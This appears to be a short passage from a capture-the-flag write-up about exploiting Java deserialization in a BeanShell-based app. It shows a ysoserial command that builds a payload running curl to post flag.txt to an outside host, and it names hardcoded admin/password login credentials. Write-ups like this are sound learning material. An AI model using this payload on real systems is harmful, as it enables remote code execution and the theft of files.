Inside pom.xml file we see package BeanShell, next step is to generate proper payload to execute `readObject` with our binary payload.
Payload was generated via `ysoserial` (compiled from source, but you can simply download jar file from github):


```console
$ java --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar  BeanShell1 'curl -X POST --data-binary @flag.txt http://myproxy' > ~/b.bin
```

then you need to login (credentials are hardcoded - admin / password) and upload a new device (where you will upload generated binary). We don't care about any serialization error or anything else, because real execution will be done before.
